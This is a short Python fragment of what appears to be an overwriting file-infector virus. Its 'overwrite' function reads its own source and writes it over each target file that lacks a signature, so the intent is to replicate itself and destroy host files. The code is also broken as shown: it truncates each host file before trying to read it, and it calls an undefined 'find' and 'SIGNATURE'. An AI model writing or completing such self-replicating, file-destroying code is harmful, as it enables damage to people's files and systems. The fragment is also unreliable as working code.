import glob
import os

def overwrite(file_set):
	for host in  file_set:
		virus_string=''
		virus=open(__file__,'r')
		for line in virus.read():
			virus_string=virus_string+line
		hostcode=open(host,'w')
		host_data=hostcode.read()
		if find(host_data,SIGNATURE)==-1:
			hostcode.write(virus_string)
			hostcode.close()